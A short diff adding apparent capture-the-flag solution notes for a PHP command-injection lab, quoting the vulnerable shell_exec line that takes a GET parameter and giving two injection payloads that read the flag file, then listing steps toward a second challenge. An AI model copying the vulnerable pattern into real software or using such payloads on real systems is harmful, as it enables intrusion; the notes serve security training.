@@ -1,0 +1,9 @@
+1. cat /var/www/html/injection.php
+2. echo shell_exec('echo '.$_GET['string'].' | md5sum');
+3a. $(cat ctf1.txt);# -> echo $(cat ctf1.txt);# | md5sum
+3b. `cat ctf1.txt`;#  -> echo `cat ctf1.txt`;# | md5sum
+4. This is the first flag. Using escape shell chars is nice, isn't it? You have one more flag. In order to take it, do the following steps:
+	(1) use the attacker/attacker credentials on the attacked machine
+	(2) run the ctf2 executable
+	(3) exploit its vulnerability; it can help looking at its code in "/var/www/html/ctf2.c"
+	(4) display the contents of the file "/root/ctf2.txt" Good luck! 
